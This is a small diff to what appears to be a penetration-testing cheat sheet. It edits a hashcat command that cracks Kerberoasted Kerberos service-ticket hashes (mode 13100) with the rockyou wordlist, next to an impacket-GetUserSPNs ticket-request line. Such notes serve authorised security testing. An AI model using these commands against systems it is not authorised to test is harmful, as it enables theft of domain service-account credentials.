@@ -123,7 +123,7 @@ impacket-GetUserSPNs '$domain'/'$user' -request
 **CRACKING HASH**
 
 ```bash
-hashcat.exe -m 13100 hashes.txt /Tools/rockyou.txt -O
+hashcat.exe -m 13100 hashes.txt /Tools/rockyou.txt
 hashcat -m 13100 hashes.txt rockyou.txt
 ```
 
